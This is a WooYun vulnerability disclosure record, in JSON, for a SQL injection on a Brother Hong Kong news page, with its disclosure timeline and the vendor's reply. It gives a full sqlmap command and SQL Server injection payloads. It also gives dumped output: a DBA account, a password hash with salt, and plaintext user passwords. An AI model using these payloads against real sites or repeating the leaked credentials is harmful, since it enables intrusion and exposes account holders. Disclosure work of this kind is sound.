{"id": 79094, "wybug_id": "wooyun-2015-0158896", "wybug_title": "Brother香港某站存在SQL注射漏洞（DBA权限+系统管理员密码+用户明文密码）（香港地區）", "wybug_corp": "Brother香港", "wybug_author": "路人甲", "wybug_date": "2015-12-07 15:22", "wybug_open_date": "2016-01-23 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向公众公开  简要描述： 超過一個世紀，Brother的產品響譽盛名有口皆碑，成為創新產品和令客人滿意的代名詞。 Brother於1908年在日本成立，現在Brother已發展成在全球各地設有16個生產設施、51個銷售點，遍佈全球44個國家。Brother為打印及影像、標籤和縫紉市場生產優質創新的產品，在業界一直佔有領先地位。主要產品包括打印機、多功能打印機、傳真機、掃瞄器、標籤機及一系列家用及商用縫紉機。 Brother作為一個全球信賴的品牌，一直在業務各方面都堅持「以客為先」的信念，更藉著全面而高質素的解決方案繼續迎合我們的客戶各式各樣的需要。 详细说明：  地址：http://**.**.**.**/en/news/news_detail.html?news=377\n$ python sqlmap.py -u \"http://**.**.**.**/en/news/news_detail.html?news=377\" -p news --technique=BE --output-dir=output --random-agent --batch  --no-cast --current-user --is-dba --users --passwords --count --search -C pass\n\ncurrent user:    'weboncms'current user is DBA:    Truedatabase management system users [1]:[*] ppsealdatabase management system users password hashes:[*] ppseal [1]:    password hash: 0x010001f7f9482c5b7e14343e74d4562db6f18b80df86de88a9d7        header: 0x0100        salt: 01f7f948        mixedcase: 2c5b7e14343e74d4562db6f18b80df86de88a9d7\n\nDatabase: dbBrother_newTable: cmsMembershipMember[4 entries]+-------------+| strPassword |+-------------+| 000000      || 111111      || sckyip      || web-on      |+-------------+\n   漏洞证明：  \n---Parameter: news (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: news=377 AND 8201=8201    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: news=377 AND 2596=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (2596=2596) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(118)+CHAR(113)))---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005current user:    'weboncms'current user is DBA:    Truedatabase management system users [1]:[*] ppsealdatabase management system users password hashes:[*] ppseal [1]:    password hash: 0x010001f7f9482c5b7e14343e74d4562db6f18b80df86de88a9d7        header: 0x0100        salt: 01f7f948        mixedcase: 2c5b7e14343e74d4562db6f18b80df86de88a9d7columns LIKE 'pass' were found in the following databases:Database: dbBrother_newTable: cmsMembershipMember[1 column]+-------------+---------+| Column      | Type    |+-------------+---------+| strPassword | varchar |+-------------+---------+Database: dbBrother_newTable: cmsMembershipMember[4 entries]+-------------+| strPassword |+-------------+| 000000      || 111111      || sckyip      || web-on      |+-------------+\n   修复方案：  上WAF。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-12-10 18:59 厂商回复： 已將事件通知有關機構 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}